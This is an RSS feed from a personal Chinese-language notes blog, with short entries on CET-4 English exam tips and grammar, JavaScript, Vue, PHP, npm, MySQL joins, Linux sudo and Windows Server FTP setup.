<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Note on Rainy · Note</title>
    <link>https://note.yxzi.xyz/tags/note/</link>
    <description>Recent content in Note on Rainy · Note</description>
    <image>
      <url>https://note.yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://note.yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 06 Jun 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://note.yxzi.xyz/tags/note/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux 命令</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/linux-%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/linux-%E5%91%BD%E4%BB%A4/</guid>
      <description>Linux 命令 sudo sudo -s 切换到 root 用户，获取管理员权限</description>
    </item>
    
    <item>
      <title>Server 2012 FTP</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/server-2012-ftp/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/server-2012-ftp/</guid>
      <description>Server 2012 FTP 安装 FTP 新建用户 新建站点  </description>
    </item>
    
    <item>
      <title>English Listening</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/listening/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/listening/</guid>
      <description>Listening 顺序原则 **题目的顺序和对话的先后顺序是绝对一致的，**绝对是第一题的关键句子出现之后，第二题的才可能出来。所以你做题的时候要是听到了第二题的答案但是第一题还没选，那赶紧瞎蒙一个，根本不影响后面的做题。
视听一致 权威统计，四级的听力有 90%的答案都是原文
耳朵听到的信息与眼睛所看到的信息越一致，则越容易称为正确答案。
 关键词与音频内容完全相符的选项。 关键词在音频中出现的次数最多的选项。  选取关键词 纵向：排除相同概念。
横向：划实不划虚，划组合概念。
  听音频的同时，眼睛来回扫视画出来的关键词。
  听见与选项对应的关键词，听到几次则标记几次。
  同转 关键词与音频内容不完全符合，但都表达用一个意思。
 同根词 词词替换 短语概念替换 泛指到特指  错误选项的特点  直接被否定。 反义表述。 选项部分信息音频中并未提及。  短篇新闻  划关键字并猜测发音。 使用视听一致 +同转的原则。 如果依旧没听出来，可以用错误选项的特点，反向选出答案。  长对话  注意换题信号以及语气的按时作用。  考前磨耳朵 考试前自己先听一两套真题。
平时如何练习 倍速听 1.2 或 1.5 倍速听，</description>
    </item>
    
    <item>
      <title>English Reading</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/reading/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/reading/</guid>
      <description>Reading 做题顺序：
Section C 仔细阅读
Section B 长阅读
Section A 选词填空
Section C 问题的顺序和文章的顺序一致，第一道题的答案在原文中的位置，一定在第二道题的前面。
keyword 读题目的时候，圈出题目中的关键词，比如时间、地点、名字、特定名称、数字数据。
建议先圈出 2~3 到题目的关键词，然后直接去读文章，等到这个 2~3 题找到答案后，再继续读剩下的题目，继续圈关键词。
Locate 根据关键字，在原文中锁定答案范围。
Analyze 分析选项和原文的匹配程度！
难一点的题目，会存在同义替换的现象，题目中和原文中的关键词并不是同一个单词，但是意思却一致。
SectionB 用 KLA 法则，但是要注意：
 题目的多个关键词在原文中都可以匹配上，或者有同义替换，这就可以确定为正确答案。  SectionA 瞎蒙就对了。
平时如何练习 第 1 遍
先计时做，模拟实战。不要看答案，把答案写在纸上。
第 2 遍
第 1 遍做完后，对照真题解析把文章中的生词查出来，包括选项题干里面的单词，把意思写在真题旁边。查完做第 2 遍，不用限时，做完后把答案写在纸上，还是不看答案。
第 3 遍
对照解析逐句翻译！！就是 1 句 1 句的翻译，不会翻译就看解析里的句子分析，把每个句子翻译通，弄懂在讲什么意思。
最后再模拟实战，做最后一遍，把答案写在纸上。
最后对答案，看看 3 遍下来，选的答案变动大不大？正确率提高了多少？如果 3 遍之后还有做错的题，重点分析错题，包括题干、选项还有对应的答案句，弄清楚是为什么错。</description>
    </item>
    
    <item>
      <title>JavaScrip class</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/class/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/class/</guid>
      <description>class 创建一个基于原型继承类。
class Phone { 	// 调用构造方法 	constructor(height, width) { 	this.area = height * width; 	}  	fun() { 	console.log(&amp;#39;i am function&amp;#39;); 	} }  let apple = new Phone(4, 3); apple.fun(); </description>
    </item>
    
    <item>
      <title>JavaScrip constructor</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/constructor/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/constructor/</guid>
      <description>constructor() 用于创建和初始化class创建的对象的特殊方法。</description>
    </item>
    
    <item>
      <title>JavaScrip Object 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/object/object-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/object/object-%E5%B1%9E%E6%80%A7/</guid>
      <description>Object 属性 constructor 返回构造当前对象的构造函数。
var array = [];  // return ƒ Array() { [native code] } console.log(array.constructor); </description>
    </item>
    
    <item>
      <title>JavaScrip static</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/static/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%B1%BB/static/</guid>
      <description>static 定义静态方法。静态方法不能在类的实例上调用静态方法，而应该通过类本身调用。
class Phone { 	static name = &amp;#39;静态方法&amp;#39;; }  let apple = new Phone(4, 3); console.log(apple.name); console.log(Phone.name); </description>
    </item>
    
    <item>
      <title>Map</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/map/map/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/map/map/</guid>
      <description>Map 用于保存键值对，并且能够记住键的原始插入顺序。任何值都可以作为一个键或一个值。
const map1 = new Map();  map1.set(&amp;#39;a&amp;#39;, 1); map1.set(&amp;#39;b&amp;#39;, 2); map1.set(&amp;#39;c&amp;#39;, 3);  console.log(map1.get(&amp;#39;a&amp;#39;)); // return 1  map1.set(&amp;#39;a&amp;#39;, 97);  console.log(map1.get(&amp;#39;a&amp;#39;)); // return 97  console.log(map1.size); // return 3  map1.delete(&amp;#39;b&amp;#39;);  console.log(map1.size); // return 2 </description>
    </item>
    
    <item>
      <title>Map 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/map/map-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/map/map-%E6%96%B9%E6%B3%95/</guid>
      <description>Map 方法 set() 添加或更新指定的键值。
delete() 移除指定元素
get() 返回一个指定元素。
clear() 清空所有元素</description>
    </item>
    
    <item>
      <title>Promise 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise-%E6%96%B9%E6%B3%95/</guid>
      <description>Promise 方法 than() then() 返回一个 Promise 对象。它有两个参数：Promise 调用resolve() 和调用 rejecte() 情况的回调函数。
返回 Promise 对象 than()的返回值如果是 Promise 对象，那么该 Promise 对象的执行结果会作为当前 than() 的返回值。
let p = new Promise((resolve, reject) =&amp;gt; { 	setTimeout(() =&amp;gt; { 	resolve(&amp;#39;success&amp;#39;); 	}, 1000); });  let result = p.then( 	(value) =&amp;gt; { 	console.log(value); 	return new Promise((resolve, reject) =&amp;gt; { 	reject(&amp;#39;fail&amp;#39;); 	}); 	}, 	(reason) =&amp;gt; { 	console.error(reason); 	} );  // rejected // &amp;#34;fail&amp;#34; console.</description>
    </item>
    
    <item>
      <title>Set</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/set/set/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/set/set/</guid>
      <description>Set 用于存储任何类型的唯一值。
数组去重 const arr = [2, 3, 4, 4, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 5, 32, 3, 4, 5]; console.log([...new Set(arr)]); 交集 并集 let arr = [1, 4, 3, 8]; let arr2 = [5, 1, 7, 2];  let union = [...new Set([...arr, ...arr2])]; console.log(union); 差集 </description>
    </item>
    
    <item>
      <title>Set 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/set/set-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/set/set-%E6%96%B9%E6%B3%95/</guid>
      <description>Set 方法 add() 向末尾添加一个指定的元素。
delete() 删除指定元素。
has() 检测 set 中是否存在指定元素。
clear() 清空所有元素。</description>
    </item>
    
    <item>
      <title>Vue 插件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E4%BB%B6/</link>
      <pubDate>Sat, 04 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E4%BB%B6/</guid>
      <description>插件 用于增强 Vue，本质是一个包含install()的一个对象。
install()的第一个参数是 Vue 构造 ，第二个参数是一个可选的选项对象：
使用
新建 plugins.js，定义一个包含install()的对象，并暴露。
export default { 	install(Vue, x) { 	console.log(Vue, x); 	}, }; 在 main.js 中导入并使用 plugins。
import plugins from &amp;#39;./plugins&amp;#39;; Vue.use(plugins, 6666); </description>
    </item>
    
    <item>
      <title>Vue 混入</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%B7%B7%E5%85%A5/</link>
      <pubDate>Sat, 04 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%B7%B7%E5%85%A5/</guid>
      <description>混入 将多个组件共用的配置提取成一个 mixin 对象。
组件自身的配置和mixin的配置相同时，则优先使用组件自身的配置。钩子函数例外，不管是组件自身的钩子函数还是 mixin的钩子函数，这些钩子函数都会被调用，且 mixin 中的钩子函数先调用，组件自身的钩子函数后调用。
mixins 局部混入，对指定的组件，应用mixin
使用
新建mixin.js，在其中配置 mixin 对象，并暴露mixin 对象。
let mixin = { 	methods: { 	fun() { 	console.log(‘mixin’); 	}, 	}, };  export default mixin; 对每个需要使用 mixin 的组件配置mixins
export default { 	name: &amp;#39;Student&amp;#39;, 	data() { 	return { 	tips: &amp;#39;Hi&amp;#39;, 	myAge: this.age, 	}; 	}, 	// 使用 mixin 	mixins: [mixin], }; mixin 全局混入，对每个组件实例（包括 Vue 实例）都应用指定的mixin。</description>
    </item>
    
    <item>
      <title>Promise</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise/</link>
      <pubDate>Fri, 03 Jun 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/promise/promise/</guid>
      <description>Promise Promise 说得通俗一点就是一种写代码的方式，并且是用来写 JavaScript 编程中的异步代码。
可以封装 ajax.
基本使用 let p = new Promise((resolve, reject) =&amp;gt; { 	if (0) { 	// 成功 	resolve(&amp;#39;success&amp;#39;); 	} else { 	// 失败 	reject(&amp;#39;fail&amp;#39;); 	} });  p.then( 	// 如果 p 调用了 resolve() 	(value) =&amp;gt; { 	console.log(value); 	}, 	// 如果 p 调用了 reject() 	(reason) =&amp;gt; { 	console.error(reason); 	} ); 读取文件 let fs = require(&amp;#39;fs&amp;#39;); let p = new Promise((resolve, reject) =&amp;gt; { 	fs.</description>
    </item>
    
    <item>
      <title>English 被动语态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/</link>
      <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/%E8%A2%AB%E5%8A%A8%E8%AF%AD%E6%80%81/</guid>
      <description>被动语态 语态是谓语动词的一种形式。
谓语动词是主动语态的句子是主动句，谓语动词是被动语态的句子是被动句。
主动语态和被动语态 主动语态：主语是动作的执行者。
 I help him.  被动语态：主语是动作的承受者。
由助动词 be + 及物动词的过去分词构成。
 He is helped by me.  被动语态就是将主动语态中的宾语（him）拿来作主语（He），而且一般的被动句子中没有宾语，除非用双宾动词构成主语。
一般现在时态 主语 + 助动词 + 及物动词的过去分词 +状语。
 I am believed by my friends. Expensive shoes are bought by rich people. He is cheated.  一般过去时态 主语 + 助动词 be 的过去式 + 及物动词的过去分词 + 状语。
 The house was built in 2001。 Her birthday party was held last week.</description>
    </item>
    
    <item>
      <title>npm view</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-view/</link>
      <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-view/</guid>
      <description>npm view 显示有关模块的数据。</description>
    </item>
    
    <item>
      <title>cookie</title>
      <link>https://note.yxzi.xyz/note/technology/internet/http/cookie/</link>
      <pubDate>Mon, 30 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/http/cookie/</guid>
      <description>cookie cookie 是网站的服务器发送到用户浏览器并保存在本地的一个小文件，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。
cookie 保存了你登录网站时的用户名、密码，有了它，只需要在下次请求服务器时带着 cookie 发送，服务器就不会再让你重新输入用户名、密码登录。
cookie 是设计用来在服务端和客户端进行信息传递的。
无法跨浏览器读取 我们使用 chrome 浏览器去访问 github 时，那么 chrome 浏览器会得到一个 cookie，当你下次访问 github 时，就无需再重新输入用户名和密码。但如果你换 Firefox 浏览器去访问 github，那么你依旧需要重新输入用户名和密码，这是因为 cookie 无法跨浏览器读取。即对于相同的网站，每个浏览器都有属于它自己的 cookie。
作用  会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等）  </description>
    </item>
    
    <item>
      <title>JavaScrip Symbol</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/symbol/</link>
      <pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/symbol/</guid>
      <description>Symbol 一般用于给对象添加一个独一无二的属性或方法。
使用Symbol()定义一个Symbol类型的数据。
// 添加方式一 var game = { 	house() {}, }; let methods = { 	fun: Symbol(), };  // 给对象中的属性添加方法 game[methods.fun] = function () { 	console.log(&amp;#39;方法1&amp;#39;); }; // 添加方式二 var game = { 	[Symbol(&amp;#39;fun&amp;#39;)]: function () { 	console.log(&amp;#39;methods one &amp;#39;); 	}, }; console.log(game);  Symbol 是原始类型，不是引用类型，不能使用 new。
Symbol()可以接受一个字符串作为参数，表示对 Symbol 实例的描述，主要是为了在控制台显示，或者转为字符串时，比较容易区分。
Symbol 类型的值时唯一的，用来解决命名冲突的问题。
Symbol 类型的值不能于其他数据进行运算
Symbol 定义的对象属性不能被遍历</description>
    </item>
    
    <item>
      <title>English CET 4</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/cet-4/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/cet-4/</guid>
      <description>CET 4 ![CET 4](CET 4.assets/CET 4.png)
分值性价比 写作性价比 = 710 * 15 % / 30 = 3.55
听力性价比 = 710 * 35 % / 25 = 9.94
阅读性价比 = 710 * 35 % / 40 = 6.21
翻译性价比 = 710 * 15 % / 30 = 3.55
由此可得：
题目的性价比：听力 &amp;gt; 阅读 &amp;gt; 作文 &amp;gt; 翻译
提分简易程度：听力 &amp;gt; 阅读 &amp;gt; 作文 &amp;gt; 翻译
考场必备  准考证、身份证、学生证（缺一不可）。 2B 铅笔、橡皮、0.5mm 黑色中性笔。 考试专用耳机  </description>
    </item>
    
    <item>
      <title>English there be</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/there-be/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/there-be/</guid>
      <description>there be 某个地方（时候）存在某个东西。
就近原则 there be 句型中的 be，用哪个格式取决于离 be 最近的主语。
 There is a book,a norebook and two dictionaries on the desk. There are two dictionaries, a book ,a notebook on the desk.  there be 和 have 的区别：
 have：谁拥有某个东西。  there be 否定句  There is no people in the room.  there be 疑问句  Are there ten people in the bedroom.  </description>
    </item>
    
    <item>
      <title>English Translation</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/translation/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/translation/</guid>
      <description>Translation 选择写基础简单句，越简单越好。
勉强表达原文意思，可以意译，千万别留空。</description>
    </item>
    
    <item>
      <title>English Writing</title>
      <link>https://note.yxzi.xyz/note/subject/english/cet-4/writing/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/cet-4/writing/</guid>
      <description>Writing 背万能句 首段
Recently, the rise in the problem of __ has aroused wide concern.
近来， **__**问题的增加已经引起了广泛的关注。
Now there is a growing awareness of the necessity to _
如今，人们越来越意识到 **__**的必要性。
Different people hold different views about**__** .
对于**__**，不同的人有不同的看法。
i think ，**_**have become an essential part of people is life
我认为， **_**已经成为人们生活中必不可少的一部分
中段
Talking about __, the first thing that may occur to you and me seems to be __.
说到**__，我们首先想到的似乎就是_**</description>
    </item>
    
    <item>
      <title>HTML 理想视口</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E7%90%86%E6%83%B3%E8%A7%86%E5%8F%A3/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E7%90%86%E6%83%B3%E8%A7%86%E5%8F%A3/</guid>
      <description>理想视口 开启移动端的理想视口。
&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width,initial-scale=1.0&amp;#34; /&amp;gt; </description>
    </item>
    
    <item>
      <title>npm package-lock.json</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/package-lock.json/</link>
      <pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/package-lock.json/</guid>
      <description>package-lock.json 是在 npm install时候生成一份文件。记录了 node_modules 目录下所有模块（包）的名称、版本号、下载地址、及这个模块又依赖了哪些依赖。
作用 如果重新 npm install 的时候以及当 node_modules 文件夹并不存在或被删除时，需要用到 npm install 重新装载全部依赖时，通过 package-lock.json 可以直接表明下载地址和相关依赖，就无需再从 package.json 逐个分析包的依赖项，因此会大大加快安装速度，package-lock.json 目的就是确保所有库包与你上次安装的完全一样。</description>
    </item>
    
    <item>
      <title>PHP 指针函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%8C%87%E9%92%88%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 26 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%8C%87%E9%92%88%E5%87%BD%E6%95%B0/</guid>
      <description>指针函数 next()和prex()会移动指针，有可能导致指针移出数组，导致
数组不能使用，此时，无法通过next() 和prex()使指针回到数组，只能通过end()或reset()重置指针。</description>
    </item>
    
    <item>
      <title>PHP closure</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/closure/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/closure/</guid>
      <description>closure php 的 Closure，v 也就是匿名函数。
匿名函数中，默认无法访问外部函数中的变量。
function demo() {  $a = 1;  function fun()  {  // 无法使用 demo() 中的 $a  echo $a;  };  fun(); }; demo(); 通过 use()将外部变量传入到内部函数的作用域内：
function demo() {  $a = 1;  $fun = function () use ($a) {   echo $a;  };  $fun(); };  demo(); 闭包 匿名函数中的use()，其作用就是从父作用域继承变量，继承之后，就会形成一个闭包。
function demo() {  $a = 1;  $fun = function () use ($a) {   echo $a;  };  return $fun; };  $closure = demo();  $closure(); </description>
    </item>
    
    <item>
      <title>PHP echo() 、print()、var_dump()的区别</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/echo-printvar_dump%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/echo-printvar_dump%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>echo() 、print()、var_dump()的区别 echo() 输出一个或多个字符串。
echo() 实际不是一个函数（而是语言结构），因此可以不使用()。
print() 输出一个或多个字符串。
print() 实际不是一个函数（而是语言结构），因此可以不使用()。
var_dump() 返回变量的类型与值。
区别  echo()能接受多个字符串类型的参数，能同时输出多个字符串。当echo()接受多个参数时，不能使用括号。 print()只能接收 1 个字符串类型的参数；只能同时输出一个字符串； print()打印的值能直接赋值给一个变量：`$a = print “123” echo()输出的速度比 print() 快。 echo()没有返回值，而print()有返回值，其返回值永远为int类型的 1。  </description>
    </item>
    
    <item>
      <title>PHP static</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/static/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/static/</guid>
      <description>static 静态全局变量与普通全局变量的区别 非静态全局变量的作用域是整个源程序， 当一个源程序由多个源文件组成时，非静态全局变量在各个源文件中都是有效的。
静态全局变量的作用域只在当前源文件内， 在同一源程序的其它源文件中不能使用它，因此可以避免变量污染。
静态局部变量与普通局部变量 静态局部变量只被初始化一次，变量下一次的值依据的是上次的结果值。
静态函数与普通函数 静态函数在内存中只有一份，普通函数在每个被调用中维持一份拷贝。
作用 拥挤函数的执行次数。
统计函数多次调用的不同结果。</description>
    </item>
    
    <item>
      <title>PHP 伪类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E4%BC%AA%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E4%BC%AA%E7%B1%BB%E5%9E%8B/</guid>
      <description>伪类型 用于在 PHP 文档里指示参数可以使用的类型和值，但实际上伪类型在 PHP 中不存在。
mixed mixed 说明一个参数可以接受多种不同的(但不一定是所有的)类型。
例如：gettype()可以接受所有的 PHP 类型，str_replace()可以接受字符串和数组，
number number 说明一个参数可以是 integer 或者 float。
callback 本文档中在 PHP5.4 引入 callable 类型之前使用了 callback 伪类型，二者涵义完全相同，
array|object array|object 意思是参数既可以是 array 也可以是 object，
void void 作为返回类型意味着函数的返回值是无用的，
void 作为参数列表意味着函数不接受任何参数，</description>
    </item>
    
    <item>
      <title>PHP 变量</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%8F%98%E9%87%8F/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%8F%98%E9%87%8F/</guid>
      <description>变量 预定义变量 指的是系统提前定义的变量，存储许多需要用到的数据，并且，预定义变量都 是数组。
$_GET：获取所有表单以 get 方式提交的数据。
$_POST：获取所有表单以 post 方式提交的 value。
$_REQUEST：GET 和 POST 提交的都会保存。
$_GLOBALS：PHP 中所有的全局变量。
$_SERVER：服务器信息。
$_SESSION：获取 session 会话数据。
$_COOKIE：获取 cookie 的会话数据。
$_ENV：环境信息。
$_FILES：用户上传的文件信息。
可变变量 可变变量就是变量的变量。
$a = &amp;#39;b&amp;#39;; $b = &amp;#39;bb&amp;#39;; // $$a = $ + $a = $ + b = $b = bb echo $$a;  </description>
    </item>
    
    <item>
      <title>MySQL 外连接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%A4%96%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%A4%96%E8%BF%9E%E6%8E%A5/</guid>
      <description>外连接 查询主表中的所有记录，如果从表中有与其匹配的记录，则显示该记录的值；如果从表中没有与其匹配的记录，则显示 Null。
左外链接 LEFT JOIN 的左侧是主表。
查询男朋友不在男神表的女神名 SELECT b.name AS Name FROM beauty AS b LEFT OUTER JOIN boys boy ON b.boyfriend_id = boy.id WHERE boy.boyName IS NULL 查询哪些部门没有员工 SELECT department_name FROM departments AS d LEFT OUTER JOIN employees e ON d.department_id = e.department_id WHERE e.department_id IS NULL 右外链接 RIGHT JOIN 的右侧是主表。
查询男朋友不在男神表的女神名 SELECT b.name AS Name FROM boys boy RIGHT OUTER JOIN beauty AS b ON b.boyfriend_id = boy.</description>
    </item>
    
    <item>
      <title>MySQL 等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
      <description>等值链接 判断不同表中都包含的字段是否相等，相等则显示，不等则过滤。且一般都用=来判断。
一般需要为表起别名。
查询员工名、部门名、工种名、并按部门名降序（三表链接） SELECT last_name, department_name,job_title FROM employees e INNER JOIN departments d ON e.department_id = d.department_id INNER JOIN jobs j ON e.job_id = j.job_id ORDER BY department_name DESC; </description>
    </item>
    
    <item>
      <title>MySQL 自链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E8%87%AA%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E8%87%AA%E8%BF%9E%E6%8E%A5/</guid>
      <description>自链接 判断同一张表中的不同字段是否相等，相等则显示，不相等则过滤。需要给同一张表取不同的别名，让系统分清同一张表中的不同字段。
查询员工名所对应的领导名 SELECT e.last_name AS employeeName,m.last_name AS managerName FROM employees AS e INNER JOIN employees AS m ON e.manager_id = m.employee_id </description>
    </item>
    
    <item>
      <title>MySQL 非等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-99/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
